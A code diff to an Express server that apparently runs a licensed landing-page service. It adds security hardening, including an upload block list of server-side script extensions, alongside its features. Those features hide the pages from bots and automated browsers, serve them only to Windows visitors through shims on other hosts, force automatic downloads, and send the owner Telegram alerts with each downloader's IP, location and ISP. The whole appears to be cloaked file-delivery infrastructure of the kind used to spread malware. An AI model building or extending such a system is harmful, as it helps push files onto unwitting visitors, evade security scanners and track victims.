@@ -12,8 +12,24 @@ const { initDb, queryAll, queryOne, runSql, rawQueryAll, rawQueryOne, pool } = r
 const pgSession = require('connect-pg-simple')(session);
 
 const app = express();
-app.set('trust proxy', true);
+// Trust exactly the immediate hop (Caddy in front of the app). Trusting `true` would let
+// any client spoof X-Forwarded-For via direct connections to the app port.
+app.set('trust proxy', 1);
+app.disable('x-powered-by');
 const PORT = process.env.PORT || 3000;
+const COOKIE_SECURE = process.env.COOKIE_SECURE === 'true';
+
+// Baseline security headers — keep narrow and additive so we don't break the React SPA
+// or the visitor-facing landing-page HTML which depends on inline scripts.
+app.use((req, res, next) => {
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
+  if (req.secure || req.headers['x-forwarded-proto'] === 'https') {
+    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
+  }
+  next();
+});
 
 // Middleware
 app.use(express.json({ limit: '50mb' }));
@@ -23,22 +39,46 @@ app.use(session({
   secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
   resave: false,
   saveUninitialized: false,
-  cookie: { maxAge: 24 * 60 * 60 * 1000 }
+  cookie: {
+    maxAge: 24 * 60 * 60 * 1000,
+    httpOnly: true,
+    sameSite: 'lax',
+    secure: COOKIE_SECURE,
+  }
 }));
 
 // File upload config
 const uploadsDir = path.join(__dirname, 'uploads');
 if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir);
 
+// Server-side execution risks if a PHP/JSP/etc. file lands in a directory that's web-served.
+// We never serve /uploads/ as PHP, but block these as defense-in-depth in case the uploads
+// volume is ever shared with a PHP host.
+const BLOCKED_UPLOAD_EXTS = new Set([
+  '.php', '.phtml', '.php3', '.php4', '.php5', '.phps', '.pht',
+  '.asp', '.aspx', '.jsp', '.jspx', '.cgi', '.pl', '.py', '.rb',
+  '.sh', '.htaccess', '.htpasswd',
+]);
+
 const storage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, uploadsDir),
   filename: (req, file, cb) => {
     const unique = Date.now() + '-' + Math.round(Math.random() * 1E9);
-    const ext = path.extname(file.originalname);
+    // Use only the extension, never the original name segment — original_name is stored
+    // separately for display. This neutralises path traversal via the saved filename.
+    const ext = path.extname(file.originalname).toLowerCase().replace(/[^.a-z0-9]/g, '').slice(0, 16);
     cb(null, unique + ext);
   }
 });
-const upload = multer({ storage, limits: { fileSize: 500 * 1024 * 1024 } });
+const upload = multer({
+  storage,
+  limits: { fileSize: 500 * 1024 * 1024 },
+  fileFilter: (req, file, cb) => {
+    const ext = path.extname(file.originalname).toLowerCase();
+    if (BLOCKED_UPLOAD_EXTS.has(ext)) return cb(new Error('File type not allowed'));
+    cb(null, true);
+  },
+});
 
 // Serve uploaded files
 app.use('/uploads', express.static(uploadsDir));
@@ -76,8 +116,72 @@ function requireAdmin(req, res, next) {
   next();
 }
 
+// Ensures the session user owns the page (or is an admin). Loads the page once and
+// attaches it to req.page so downstream handlers don't have to re-query. Use after requireAuth.
+async function requirePageAccess(req, res, next) {
+  const page = await queryOne('SELECT * FROM pages WHERE id = ?', [req.params.id]);
+  if (!page) return res.status(404).json({ error: 'Page not found' });
+  if (req.session.user.role !== 'Admin' && page.user_id !== req.session.user.id) {
+    return res.status(403).json({ error: 'You do not have access to this page' });
+  }
+  req.page = page;
+  next();
+}
+
+// Same idea for versions — load the version, fetch its page, check ownership.
+async function requireVersionAccess(req, res, next) {
+  const ver = await queryOne('SELECT * FROM versions WHERE id = ?', [req.params.id]);
+  if (!ver) return res.status(404).json({ error: 'Version not found' });
+  const page = await queryOne('SELECT id, user_id FROM pages WHERE id = ?', [ver.page_id]);
+  if (!page) return res.status(404).json({ error: 'Page not found' });
+  if (req.session.user.role !== 'Admin' && page.user_id !== req.session.user.id) {
+    return res.status(403).json({ error: 'You do not have access to this version' });
+  }
+  req.version = ver;
+  req.page = page;
+  next();
+}
+
 function logActivity(action, details, userName) {
   runSql('INSERT INTO activity (action, details, user_name, date) VALUES (?, ?, ?, ?)', [action, details, userName, today()]);
+}
+
+// Safe interpolation of strings into a <script> body. Escapes characters that could
+// break the JS literal context (quotes, backslashes, newlines, line terminators) AND
+// the surrounding HTML context (forward slash protects against </script> early-close,
+// < protects against <!-- and <script start, & protects against HTML entity tricks).
+function jsStringEscape(s) {
+  return String(s == null ? '' : s)
+    .replace(/\\/g, '\\\\')
+    .replace(/"/g, '\\"')
+    .replace(/'/g, "\\'")
+    .replace(/\n/g, '\\n')
+    .replace(/\r/g, '\\r')
+    .replace(/\u2028/g, '\\u2028')
+    .replace(/\u2029/g, '\\u2029')
+    .replace(/</g, '\\u003c')
+    .replace(/>/g, '\\u003e')
+    .replace(/&/g, '\\u0026');
+}
+
+// Safe interpolation into HTML attribute values (double-quoted).
+function htmlAttrEscape(s) {
+  return String(s == null ? '' : s)
+    .replace(/&/g, '&amp;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+// Resolves a file_path stored in the DB to an absolute path inside uploadsDir, or null
+// if the resolved path would escape the directory. Use before any fs.unlink / res.download.
+function safeUploadPath(filePath) {
+  if (!filePath) return null;
+  const resolvedDir = path.resolve(uploadsDir);
+  const resolved = path.resolve(uploadsDir, filePath);
+  if (resolved !== resolvedDir && !resolved.startsWith(resolvedDir + path.sep)) return null;
+  return resolved;
 }
 
 // ═══════════ ANTIBOT SYSTEM ═══════════
@@ -135,6 +239,30 @@ function getClientIp(req) {
   if (ip && ip.startsWith('::ffff:')) return ip.substring(7);
   return ip || 'unknown';
 }
+
+// ═══════════ LICENSING ═══════════
+// User-account licensing. Admins are exempt. Pages with user_id = NULL are admin-owned
+// and not subject to licensing — they keep rendering regardless of any user's license state.
+const LICENSE_DURATIONS_MS = { weekly: 7 * 86400000, monthly: 30 * 86400000 };
+function isAdminUser(user) { return !!user && user.role === 'Admin'; }
+function isLicenseActive(user) {
+  if (!user) return false;
+  if (isAdminUser(user)) return true;
+  if (!user.license_expires_at) return false;
+  return new Date(user.license_expires_at).getTime() > Date.now();
+}
+function licenseSummary(user) {
+  if (!user) return null;
+  if (isAdminUser(user)) return { plan: 'admin', active: true, expires_at: null, remaining_ms: null };
+  const expiresAt = user.license_expires_at ? new Date(user.license_expires_at).getTime() : null;
+  return { plan: user.license_plan || null, active: isLicenseActive(user), expires_at: user.license_expires_at, remaining_ms: expiresAt ? expiresAt - Date.now() : null };
+}
+async function pageOwnerIsLicensed(page) {
+  if (!page || !page.user_id) return true;
+  const owner = await queryOne('SELECT id, role, license_plan, license_expires_at FROM users WHERE id = ?', [page.user_id]);
+  return isLicenseActive(owner);
+}
+const BLANK_HTML = '<!DOCTYPE html><html><head><title></title></head><body></body></html>';
 
 function isKnownBot(ua) {
   if (!ua) return true;
@@ -284,8 +412,8 @@ function challengePageHtml(nonce, originalUrl) {
 <script>
 (function(){
 var startTime=Date.now();
-var nonce="${nonce}";
-var origUrl="${originalUrl.replace(/"/g, '\\"')}";
+var nonce="${jsStringEscape(nonce)}";
+var origUrl="${jsStringEscape(originalUrl)}";
 var checks={
 webdriver:navigator.webdriver===true,
 phantom:!!window._phantom||!!window.phantom,
@@ -311,7 +439,7 @@ setTimeout(function(){
 var honeypot=document.getElementById("hp_website").value;
 var payload={nonce:nonce,elapsed:Date.now()-startTime,checks:checks,fp:fp,honeypot:honeypot};
 var xhr=new XMLHttpRequest();
-xhr.open("POST","/api/bot-verify",true);
+xhr.open("POST","api/bot-verify",true);
 xhr.setRequestHeader("Content-Type","application/json");
 xhr.onload=function(){
 if(xhr.status===200){
@@ -330,7 +458,8 @@ xhr.send(JSON.stringify(payload));
 // Bot guard middleware — applied per route under the shim mount and on admin preview routes.
 async function botGuard(req, res, next) {
   // /api/bot-verify owns its own validation flow — skip the guard
-  if (req.path === '/api/bot-verify') return next();
+  // Matches both the root path and shim-prefixed paths like /landing/api/bot-verify
+  if (req.path === '/api/bot-verify' || req.path.endsWith('/api/bot-verify')) return next();
 
   // /download/* — limited check (no challenge, but blocklist/UA/rate-limit still enforced)
   if (req.path.startsWith('/download/')) {
@@ -396,9 +525,12 @@ async function botGuard(req, res, next) {
 
   // 7. Serve challenge page
   const nonce = crypto.randomBytes(16).toString('hex');
-  const originalUrl = req.originalUrl || req.url;
-  challengeTokenStore.set(nonce, { ip, originalUrl, pageId: earlyPageId, expires: Date.now() + 300000 });
-  return res.status(200).send(challengePageHtml(nonce, originalUrl));
+  const rawUrl = req.originalUrl || req.url;
+  // For shim-routed requests, strip the /_shim/proxy mount so the post-verify redirect
+  // lands on the visitor-facing URL (e.g. /landing/), not the internal proxy path.
+  const visitorUrl = req._shimPageId ? (rawUrl.replace(/^\/_shim\/proxy/, '') || '/') : rawUrl;
+  challengeTokenStore.set(nonce, { ip, originalUrl: visitorUrl, pageId: earlyPageId, expires: Date.now() + 300000 });
+  return res.status(200).send(challengePageHtml(nonce, visitorUrl));
 }
 
 // (botGuard is applied per-route below: on the /_shim/proxy mount and on /page/:id / /download/:id.)
@@ -434,33 +566,262 @@ function windowsOnlyPage() {
 </div></body></html>`;
 }
 
+// Returns the download URL the visitor's browser should hit. For shim deployments the
+// shim is mounted at an arbitrary subdirectory on the visitor host (e.g. /landing/), so
+// using '/download/...' would skip the shim and hit the host root. Use a path relative
+// to the shim's mount instead so the browser request goes back through the shim and
+// reaches the central server's download route.
+function buildDownloadUrl(req, pageId) {
+  if (!req || !req._shimPageId) return '/download/' + pageId;
+  const visitorUrl = (req.originalUrl || '/').replace(/^\/_shim\/proxy/, '') || '/';
+  const mount = visitorUrl.endsWith('/')
+    ? visitorUrl
+    : visitorUrl.substring(0, visitorUrl.lastIndexOf('/') + 1);
+  return mount + 'download/' + pageId;
+}
+
+// Resolves the user the request is "for" — the deployment owner (visitor traffic via shim),
+// or the logged-in dashboard user (preview), or null (legacy / public). Used to select the
+// correct active version in the per-user isolation model.
+function effectiveUserForRequest(req) {
+  if (!req) return null;
+  if (req._shimUserId !== undefined) return req._shimUserId; // may be null for legacy shims
+  if (req.session && req.session.user) return req.session.user.id;
+  return null;
+}
+
+// Finds the active version for a (page, user) pair. STRICT per-user isolation: when a
+// userId is given, only that user's own active version is returned — we never fall back
+// to a NULL-user / legacy / admin-uploaded version, because that would mean a visitor
+// hitting User A's shim deployment could be served User B's (or anyone's) file.
+// userId === null is reserved for true anonymous lookups (admin-owned pages, legacy
+// direct /page/:id traffic with no session); only then do we serve the NULL-user version.
+async function findActiveVersion(pageId, userId) {
+  if (userId) {
+    return await queryOne('SELECT * FROM versions WHERE page_id = ? AND user_id = ? AND active = 1 LIMIT 1', [pageId, userId]);
+  }
+  return await queryOne('SELECT * FROM versions WHERE page_id = ? AND user_id IS NULL AND active = 1 LIMIT 1', [pageId]);
+}
+
+function formatBytes(n) {
+  if (!n && n !== 0) return '';
+  if (n < 1024) return n + ' B';
+  if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
+  if (n < 1024 * 1024 * 1024) return (n / (1024 * 1024)).toFixed(1) + ' MB';
+  return (n / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
+}
+
+// ═══════════ TELEGRAM ALERTS ═══════════
+function tgHtmlEscape(s) {
+  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+}
+function countryFlagEmoji(cc) {
+  if (!cc || typeof cc !== 'string' || cc.length !== 2) return '';
+  const code = cc.toUpperCase();
+  const A = 0x1F1E6;
+  return String.fromCodePoint(A + code.charCodeAt(0) - 65) + String.fromCodePoint(A + code.charCodeAt(1) - 65);
+}
+function sendTelegram(botToken, chatId, htmlText) {
+  return new Promise((resolve) => {
+    if (!botToken || !chatId) return resolve({ ok: false, err: 'not configured' });
+    const payload = JSON.stringify({ chat_id: String(chatId), text: htmlText, parse_mode: 'HTML', disable_web_page_preview: true });
+    const opts = {
+      method: 'POST',
+      hostname: 'api.telegram.org',
+      path: '/bot' + botToken + '/sendMessage',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
+    };
+    const reqT = https.request(opts, (resT) => {
+      let data = '';
+      resT.on('data', c => { data += c; });
+      resT.on('end', () => {
+        try {
+          const j = JSON.parse(data);
+          if (j.ok) return resolve({ ok: true });
+          resolve({ ok: false, err: j.description || ('HTTP ' + resT.statusCode) });
+        } catch {
+          resolve({ ok: false, err: 'invalid response' });
+        }
+      });
+    });
+    reqT.on('error', (e) => resolve({ ok: false, err: e.message }));
+    reqT.setTimeout(8000, () => { reqT.destroy(); resolve({ ok: false, err: 'timeout' }); });
+    reqT.write(payload);
+    reqT.end();
+  });
+}
+async function notifyDownload(req, page, version) {
+  try {
+    // Prefer the user who actually deployed/served this shim (per-user isolation),
+    // fall back to the page owner for legacy / direct /page/:id traffic.
+    const alertUserId = req._shimUserId || page.user_id || null;
+    const owner = alertUserId
+      ? await queryOne('SELECT id, name, email, telegram_bot_token, telegram_chat_id FROM users WHERE id = ?', [alertUserId])
+      : null;
+    const gToken = await queryOne("SELECT value FROM settings WHERE key = 'telegram_bot_token'");
+    const gChat  = await queryOne("SELECT value FROM settings WHERE key = 'telegram_chat_id'");
+    const targets = [];
+    if (owner && owner.telegram_bot_token && owner.telegram_chat_id) {
+      targets.push({ label: 'owner', token: owner.telegram_bot_token, chat: owner.telegram_chat_id });
+    }
+    if (gToken && gToken.value && gChat && gChat.value) {
+      const isDup = targets.some(t => t.token === gToken.value && t.chat === gChat.value);
+      if (!isDup) targets.push({ label: 'global', token: gToken.value, chat: gChat.value });
+    }
+    if (!targets.length) return;
+
+    const ip = req._shimRealIp || getClientIp(req);
+    const ua = req.headers['user-agent'] || '';
+    let geo = null;
+    try { geo = await ip2locationLookup(ip); } catch {}
+    const cc = geo && !geo._error ? geo.country_code : '';
+    const flag = countryFlagEmoji(cc);
+    const loc = geo && !geo._error
+      ? [geo.city_name, geo.region_name, geo.country_name].filter(Boolean).join(', ')
+      : '';
+    const isp = geo && !geo._error ? (geo.isp || geo.domain || '') : '';
+
+    let host = '';
+    try {
+      const ref = req.headers['referer'] || '';
+      if (ref) host = new URL(ref).host;
+    } catch {}
+    if (!host) host = req.headers['host'] || '';
+
+    let sizeStr = '';
+    if (version.file_path) {
+      const fp = safeUploadPath(version.file_path);
+      if (fp) { try { sizeStr = formatBytes(fs.statSync(fp).size); } catch { /* missing */ } }
+    }
+    const fileLine = version.link_url
+      ? '🔗 ' + tgHtmlEscape(version.link_url)
+      : tgHtmlEscape(version.original_name || version.file_name || '') + (sizeStr ? ' (' + tgHtmlEscape(sizeStr) + ')' : '');
+
+    const lines = [
+      '🟢 <b>New download</b>',
+      '<b>Page:</b> ' + tgHtmlEscape(page.name || '') + (owner ? ' <i>(' + tgHtmlEscape(owner.name) + ')</i>' : ''),
+      '<b>Version:</b> v' + tgHtmlEscape(version.version || '?'),
+      '<b>File:</b> ' + fileLine,
+      '<b>IP:</b> ' + tgHtmlEscape(ip) + (flag ? ' ' + flag : ''),
+      loc ? '<b>Location:</b> ' + tgHtmlEscape(loc) : null,
+      isp ? '<b>ISP:</b> ' + tgHtmlEscape(isp) : null,
+      ua ? '<b>UA:</b> <code>' + tgHtmlEscape(ua.slice(0, 220)) + '</code>' : null,
+      host ? '<b>Host:</b> ' + tgHtmlEscape(host) : null,
+      '<b>Time:</b> ' + new Date().toISOString(),
+    ].filter(Boolean);
+
+    const text = lines.join('\n');
+    await Promise.all(targets.map(t => sendTelegram(t.token, t.chat, text).then(r => {
+      if (!r.ok) console.warn('Telegram (' + t.label + ') failed:', r.err);
+    })));
+  } catch (err) {
+    console.warn('notifyDownload error:', err.message);
+  }
+}
+async function notifyUpload(page, version, uploader) {
+  try {
+    const owner = page.user_id
+      ? await queryOne('SELECT id, name, telegram_bot_token, telegram_chat_id FROM users WHERE id = ?', [page.user_id])
+      : null;
+    const gToken = await queryOne("SELECT value FROM settings WHERE key = 'telegram_bot_token'");
+    const gChat  = await queryOne("SELECT value FROM settings WHERE key = 'telegram_chat_id'");
+    const targets = [];
+    if (owner && owner.telegram_bot_token && owner.telegram_chat_id) {
+      targets.push({ label: 'owner', token: owner.telegram_bot_token, chat: owner.telegram_chat_id });
+    }
+    if (gToken && gToken.value && gChat && gChat.value) {
+      const isDup = targets.some(t => t.token === gToken.value && t.chat === gChat.value);
+      if (!isDup) targets.push({ label: 'global', token: gToken.value, chat: gChat.value });
+    }
+    if (!targets.length) return;
+
+    const fileLine = version.link_url
+      ? '🔗 ' + tgHtmlEscape(version.link_url)
+      : tgHtmlEscape(version.original_name || version.file_name || '');
+
+    const lines = [
+      '📤 <b>New upload</b>',
+      '<b>Page:</b> ' + tgHtmlEscape(page.name || '') + (owner ? ' <i>(' + tgHtmlEscape(owner.name) + ')</i>' : ''),
+      '<b>Version:</b> v' + tgHtmlEscape(version.version || '?'),
+      '<b>File:</b> ' + fileLine,
+      '<b>Uploaded by:</b> ' + tgHtmlEscape((uploader && uploader.name) || ''),
+      '<b>Time:</b> ' + new Date().toISOString(),
+    ].filter(Boolean);
+
+    const text = lines.join('\n');
+    await Promise.all(targets.map(t => sendTelegram(t.token, t.chat, text).then(r => {
+      if (!r.ok) console.warn('Telegram (' + t.label + ') failed:', r.err);
+    })));
+  } catch (err) {
+    console.warn('notifyUpload error:', err.message);
+  }
+}
+
 // Shared page renderer
-async function renderPage(page, res) {
-  const activeVersion = await queryOne('SELECT * FROM versions WHERE page_id = ? AND active = 1 LIMIT 1', [page.id]);
+async function renderPage(page, res, req) {
+  const effectiveUid = effectiveUserForRequest(req);
+  const activeVersion = await findActiveVersion(page.id, effectiveUid);
   const isLink = activeVersion && activeVersion.link_url;
-  const downloadUrl = activeVersion ? '/download/' + page.id : '';
+  const downloadUrl = activeVersion ? buildDownloadUrl(req, page.id) : '';
   const fileName = activeVersion ? (isLink ? (page.name || 'Download') : (activeVersion.original_name || activeVersion.file_name)) : '';
   const version = activeVersion ? activeVersion.version : '';
+  const releaseDate = activeVersion ? (activeVersion.date || '') : '';
+  // File size — only available for uploaded files, not external links.
+  let fileSize = '';
+  if (activeVersion && activeVersion.file_path) {
+    const fp = safeUploadPath(activeVersion.file_path);
+    if (fp) { try { fileSize = formatBytes(fs.statSync(fp).size); } catch { /* missing on disk */ } }
+  }
+  const year = String(new Date().getFullYear());
+  // Post-download redirect — http(s) only (validated on save, re-checked here to be defensive
+  // against legacy/malformed rows). Fires REDIRECT_DELAY_MS after the download is triggered.
+  const REDIRECT_DELAY_MS = 5000;
+  const rawRedirect = (page.redirect_url || '').trim();
+  const redirectUrl = /^https?:\/\//i.test(rawRedirect) ? rawRedirect : '';
+
+  // Pre-built snippets the author can drop in as a single token.
+  const downloadButtonHtml = downloadUrl
+    ? `<a href="${htmlAttrEscape(downloadUrl)}"${isLink ? '' : ` download="${htmlAttrEscape(fileName)}"`} class="sc-download-btn" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#4ade80,#22c55e);color:#000;font-family:Segoe UI,Arial,sans-serif;font-weight:700;font-size:1rem;padding:12px 32px;border-radius:8px;text-decoration:none;box-shadow:0 4px 15px rgba(74,222,128,0.3);"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>Download ${htmlAttrEscape(fileName)}${fileSize ? ' (' + htmlAttrEscape(fileSize) + ')' : ''}</a>`
+    : '';
+  const downloadLinkHtml = downloadUrl
+    ? `<a href="${htmlAttrEscape(downloadUrl)}"${isLink ? '' : ` download="${htmlAttrEscape(fileName)}"`}>${htmlAttrEscape(fileName)}</a>`
+    : '';
+  const autoDownloadScript = downloadUrl
+    ? `<script>setTimeout(function(){if(window.__scDownload){window.__scDownload();}},2000);</script>`
+    : '';
 
   let html = page.html_code;
-  html = html.replace(/\{\{download_url\}\}/g, downloadUrl);
-  html = html.replace(/\{\{file_name\}\}/g, fileName);
-  html = html.replace(/\{\{version\}\}/g, version);
-  html = html.replace(/\{\{app_name\}\}/g, page.name || '');
+  // Substitutions go into HTML attribute / text context within an admin-controlled template.
+  // HTML-escape so a hostile original_name (e.g. "><script>...) can't break out.
+  html = html.replace(/\{\{download_url\}\}/g, htmlAttrEscape(downloadUrl));
+  html = html.replace(/\{\{file_name\}\}/g, htmlAttrEscape(fileName));
+  html = html.replace(/\{\{file_size\}\}/g, htmlAttrEscape(fileSize));
+  html = html.replace(/\{\{version\}\}/g, htmlAttrEscape(version));
+  html = html.replace(/\{\{app_name\}\}/g, htmlAttrEscape(page.name || ''));
+  html = html.replace(/\{\{release_date\}\}/g, htmlAttrEscape(releaseDate));
+  html = html.replace(/\{\{year\}\}/g, year);
+  html = html.replace(/\{\{is_link\}\}/g, isLink ? 'true' : 'false');
+  html = html.replace(/\{\{download_button\}\}/g, downloadButtonHtml);
+  html = html.replace(/\{\{download_link\}\}/g, downloadLinkHtml);
+  html = html.replace(/\{\{auto_download_script\}\}/g, autoDownloadScript);
+  html = html.replace(/\{\{redirect_url\}\}/g, htmlAttrEscape(redirectUrl));
 
   // Inject download helper — triggers download without navigating away, then shows completion
   if (downloadUrl) {
+    const redirectLine = redirectUrl
+      ? `if(!window.__scRedirected){window.__scRedirected=true;setTimeout(function(){window.location.href="${jsStringEscape(redirectUrl)}";},${REDIRECT_DELAY_MS});}`
+      : '';
     const dlHelper = `
 <iframe id="sc-dl-frame" name="sc-dl-frame" style="display:none"></iframe>
 <script>
 (function(){
-  var dlUrl="${downloadUrl}";
+  var dlUrl="${jsStringEscape(downloadUrl)}";
   var isLink=${isLink ? 'true' : 'false'};
   function triggerDownload(){
     if(isLink){
       window.open(dlUrl,"sc-dl-frame");
     }else{
-      var a=document.createElement("a");a.href=dlUrl;a.download="${fileName.replace(/"/g, '')}";a.style.display="none";document.body.appendChild(a);a.click();document.body.removeChild(a);
+      var a=document.createElement("a");a.href=dlUrl;a.download="${jsStringEscape(fileName)}";a.style.display="none";document.body.appendChild(a);a.click();document.body.removeChild(a);
     }
     setTimeout(function(){
       var s=document.getElementById("status")||document.getElementById("sc-dl-status");
@@ -470,6 +831,7 @@ async function renderPage(page, res) {
       var m=document.querySelector(".manual");
       if(m){m.innerHTML='<span style="color:#16a34a;font-weight:600">✅ Download completed successfully</span>';}
     },1500);
+    ${redirectLine}
   }
   window.__scDownload=triggerDownload;
   var origHref=Object.getOwnPropertyDescriptor(window.location.__proto__||Object.getPrototypeOf(window.location),"href");
@@ -492,27 +854,24 @@ async function renderPage(page, res) {
   }
 
   // Only inject floating bar + auto-download if the template does NOT already handle downloads
-  const templateHandlesDownload = page.html_code.includes('{{download_url}}');
+  const templateHandlesDownload = /\{\{(download_url|download_button|download_link|auto_download_script)\}\}/.test(page.html_code);
 
   if (downloadUrl && !templateHandlesDownload) {
-    // Floating download button for templates without a download button
+    // Floating download button for templates without a download button.
+    // Both auto-fire and the manual click route through window.__scDownload (defined in
+    // dlHelper above) so the post-download redirect — and any other side effects — happen
+    // exactly once regardless of how the download was triggered.
     const floatingBtn = `
 <div id="sc-download-bar" style="position:fixed;bottom:0;left:0;right:0;z-index:999999;background:linear-gradient(135deg,#1a1a2e,#16213e);border-top:2px solid #0f3460;padding:14px 20px;display:flex;align-items:center;justify-content:center;gap:14px;box-shadow:0 -4px 20px rgba(0,0,0,0.5);">
   <span style="color:#94a3b8;font-family:Segoe UI,Arial,sans-serif;font-size:0.9rem;">Your download is ready</span>
-  <a href="${downloadUrl}" ${isLink ? '' : 'download="' + fileName.replace(/"/g, '') + '"'} style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#4ade80,#22c55e);color:#000;font-family:Segoe UI,Arial,sans-serif;font-weight:700;font-size:0.95rem;padding:10px 28px;border-radius:8px;text-decoration:none;box-shadow:0 4px 15px rgba(74,222,128,0.3);transition:transform 0.2s,box-shadow 0.2s;" onmouseover="this.style.transform='scale(1.05)';this.style.boxShadow='0 6px 25px rgba(74,222,128,0.45)'" onmouseout="this.style.transform='scale(1)';this.style.boxShadow='0 4px 15px rgba(74,222,128,0.3)'">
+  <a href="${htmlAttrEscape(downloadUrl)}" ${isLink ? '' : 'download="' + htmlAttrEscape(fileName) + '"'} onclick="if(window.__scDownload){window.__scDownload();return false;}" style="display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#4ade80,#22c55e);color:#000;font-family:Segoe UI,Arial,sans-serif;font-weight:700;font-size:0.95rem;padding:10px 28px;border-radius:8px;text-decoration:none;box-shadow:0 4px 15px rgba(74,222,128,0.3);transition:transform 0.2s,box-shadow 0.2s;" onmouseover="this.style.transform='scale(1.05)';this.style.boxShadow='0 6px 25px rgba(74,222,128,0.45)'" onmouseout="this.style.transform='scale(1)';this.style.boxShadow='0 4px 15px rgba(74,222,128,0.3)'">
     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-    Download ${fileName}
+    Download ${htmlAttrEscape(fileName)}
   </a>
   <button onclick="document.getElementById('sc-download-bar').style.display='none'" style="position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:#64748b;cursor:pointer;font-size:1.2rem;padding:4px 8px;" title="Dismiss">&times;</button>
 </div>`;
 
-    let autoScript = '';
-    if (isLink) {
-      autoScript = 'setTimeout(function(){window.location.href="' + downloadUrl + '";},2000);';
-    } else {
-      const safeFileName = fileName.replace(/"/g, '');
-      autoScript = 'setTimeout(function(){var a=document.createElement("a");a.href="' + downloadUrl + '";a.download="' + safeFileName + '";document.body.appendChild(a);a.click();document.body.removeChild(a);},2000);';
-    }
+    const autoScript = 'setTimeout(function(){if(window.__scDownload)window.__scDownload();},2000);';
     const inject = floatingBtn + '\n<script>(function(){if(document.readyState==="complete"||document.readyState==="interactive"){' + autoScript + '}else{document.addEventListener("DOMContentLoaded",function(){' + autoScript + '});}})();</scr' + 'ipt>';
 
     // Inject before </body> if present (case-insensitive), otherwise append
@@ -524,6 +883,34 @@ async function renderPage(page, res) {
     }
   }
 
+  // Auto-translate: silently switches the page to the visitor's browser language via
+  // Google's client-side website-translator widget (no API key needed). Skipped for
+  // English visitors since the source markup is authored in English.
+  const translateScript = `
+<div id="google_translate_element" style="display:none;"></div>
+<script>
+(function(){
+  try{
+    var nl=(navigator.language||navigator.userLanguage||'en').split('-')[0].toLowerCase();
+    if(nl&&nl!=='en'){
+      document.cookie='googtrans=/en/'+nl+'; path=/';
+      window.googleTranslateElementInit=function(){
+        new google.translate.TranslateElement({pageLanguage:'en',autoDisplay:false},'google_translate_element');
+      };
+      var s=document.createElement('script');
+      s.src='https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit';
+      document.head.appendChild(s);
+    }
+  }catch(e){}
+})();
+</scr` + `ipt>`;
+  const bodyCloseT = html.match(/<\/body>/i);
+  if (bodyCloseT) {
+    html = html.replace(bodyCloseT[0], translateScript + bodyCloseT[0]);
+  } else {
+    html += translateScript;
+  }
+
   res.send(html);
 }
 
@@ -531,10 +918,13 @@ async function renderPage(page, res) {
 // Looks up the page the deployment was issued for and renders it.
 async function shimPageRoute(req, res, next) {
   if (!req._shimPageId) return next();
-  const page = await queryOne('SELECT id, html_code, name, status FROM pages WHERE id = ?', [req._shimPageId]);
+  const page = await queryOne('SELECT id, html_code, name, status, user_id FROM pages WHERE id = ?', [req._shimPageId]);
   if (!page || !page.html_code) return next();
+  // Licensing: if the page has an owner whose license has expired, serve a blank page.
+  // Pages without an owner (user_id NULL) are admin-managed and bypass this check.
+  if (!(await pageOwnerIsLicensed(page))) return res.status(200).send(BLANK_HTML);
   if (!isWindows(req.headers['user-agent'])) return res.send(windowsOnlyPage());
-  await renderPage(page, res);
+  await renderPage(page, res, req);
 }
 
 // ═══════════ BOT VERIFY ═══════════
@@ -697,16 +1087,22 @@ app.get('/api/visitor-logs', requireAdmin, async (req, res) => {
   const where = [];
   const params = [];
   let paramIdx = 0;
-  if (req.query.country) { paramIdx++; where.push('country_code = $' + paramIdx); params.push(req.query.country); }
-  if (req.query.blocked === 'true') { where.push('is_blocked = 1'); }
-  else if (req.query.blocked === 'false') { where.push('is_blocked = 0'); }
-  if (req.query.from) { paramIdx++; where.push('created >= $' + paramIdx); params.push(req.query.from); }
-  if (req.query.to) { paramIdx++; where.push('created <= $' + paramIdx); params.push(req.query.to + 'T23:59:59'); }
+  if (req.query.country) { paramIdx++; where.push('vl.country_code = $' + paramIdx); params.push(req.query.country); }
+  if (req.query.blocked === 'true') { where.push('vl.is_blocked = 1'); }
+  else if (req.query.blocked === 'false') { where.push('vl.is_blocked = 0'); }
+  if (req.query.from) { paramIdx++; where.push('vl.created >= $' + paramIdx); params.push(req.query.from); }
+  if (req.query.to) { paramIdx++; where.push('vl.created <= $' + paramIdx); params.push(req.query.to + 'T23:59:59'); }
   const whereClause = where.length > 0 ? 'WHERE ' + where.join(' AND ') : '';
-  const totalRow = await rawQueryOne('SELECT COUNT(*) as c FROM visitor_logs ' + whereClause, params) || { c: 0 };
+  const totalRow = await rawQueryOne('SELECT COUNT(*) as c FROM visitor_logs vl ' + whereClause, params) || { c: 0 };
   paramIdx++;
   paramIdx++;
